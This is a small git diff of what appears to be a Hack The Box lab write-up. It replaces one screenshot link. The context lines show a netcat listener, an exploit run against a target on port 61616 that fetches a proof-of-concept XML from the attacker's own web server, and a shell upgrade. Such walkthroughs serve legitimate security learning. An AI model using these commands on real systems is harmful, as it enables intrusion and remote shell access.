@@ -32,7 +32,7 @@ nc -lvvp 4444
 go run main.go -i 10.10.11.243 -p 61616 -u http://10.10.14.12:8001/poc-linux.xml
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
-![image](https://github.com/regarmulia/HTB/assets/33616880/169c76d4-7ac4-4fae-acd7-42e63f508289)
+![image](https://github.com/regarmulia/HTB/assets/33616880/02a6e7d6-a3cd-486c-9719-80fa5efa2b77)
 
 ![image](https://github.com/regarmulia/HTB/assets/33616880/497cfa98-5b46-4748-bb90-3504ed9869d3)
 
